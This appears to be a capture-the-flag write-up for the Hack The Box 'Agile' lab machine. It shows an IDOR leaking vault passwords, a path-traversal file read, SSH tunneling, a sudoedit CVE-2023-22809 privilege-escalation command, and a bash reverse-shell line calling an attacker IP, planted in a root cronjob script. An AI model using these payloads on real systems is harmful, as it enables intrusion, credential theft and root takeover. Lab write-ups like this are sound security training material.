# Agile

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Agile/Agile.png)

## nmap
    
    ```
    22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCeVL2Hl8/LXWurlu46JyqOyvUHtAwTrz1EYdY5dXVi9BfpPwsPTf+zzflV+CGdflQRNFKPDS8RJuiXQa40xs9o=
    |   256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEcaZPDjlx21ppN0y2dNT1Jb8aPZwfvugIeN6wdUH1cK
    80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://superpass.htb
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    ```
    

## IDOR

When we edit our password entries, we can change the id in the URL

- /vault/edit_row/3

```
url - hackthebox.com
username - 0xdf
password - 762b430d32eea2f12970
```

- /vault/edit_row/4

```
url - mgoblog.com
username - 0xdf
password - 5b133f7a6a1c180646cb
```

- /vault/edit_row/6

```
url - mgoblog
username - corum
password - 47ed1e73c955de230a1d
```

- /vault/edit_row/7

```
url - ticketmaster
username - corum
password - 9799588839ed0f98c211
```

- /vault/edit_row/8

```
url - agile
username - corum
password - 5db7caa1d13cc37c9fc2
```

We find with dirsearch the path `/download`

## LFI

We can use the `fn` `URL-Parameter` to read files from `/tmp`

- [http://superpass.htb/download?fn=../etc/passwd](http://superpass.htb/download?fn=../etc/passwd)

We know there is the user corum in /etc/passwd

We can login over ssh with the password

`corum : 5db7caa1d13cc37c9fc2`

→ user.txt

# Lateral Movement: from edwards

- `netstat -tulpn`

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:58409         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 ::1:58409               :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

We see the port `5555` is the password vault website, but this is only at the localhost.

## SSH Tunneling

- `ssh -L 5555:127.0.0.1:5555 corum@agile.htb`

Create a new account and use the IDOR again

### IDOR

- `/vault/edit_row/1`

```
url - agile
username - edwards
password - d07867c6267dcb5df0af
```

We can now login to the user

`edwards : d07867c6267dcb5df0af`

# Lateral Movement: from dev_admin

- `sudo -l`

```
User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

### sudoedit — [`CVE-2023-22809`](https://nvd.nist.gov/vuln/detail/CVE-2023-22809)

> In Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a "--" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value.
> 
- `sudo -V`

```
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

We can use this exploit to read any file from user `dev_admin`

https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc

[Part 14 - CVE-2023-22809](https://www.youtube.com/watch?v=EYGdHwkaqmA&ab_channel=BlueAce)

- `find / -type f -group dev_admin 2>/dev/null`

```
/app/venv/bin/activate
/app/venv/bin/Activate.ps1
/app/venv/bin/activate.fish
/app/venv/bin/activate.csh
```

### PsPy

We see root runs this file in a cronjob !

```
2023/03/08 19:52:01 CMD: UID=0    PID=2380   | /bin/bash -c source /app/venv/bin/activate
```

Write a rev shell to this file. 

- `EDITOR='vi -- /app/venv/bin/activate' sudo -u dev_admin sudoedit /app/config_test.json`

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'
```

Save with :wq!

After some time…

→ root.txt
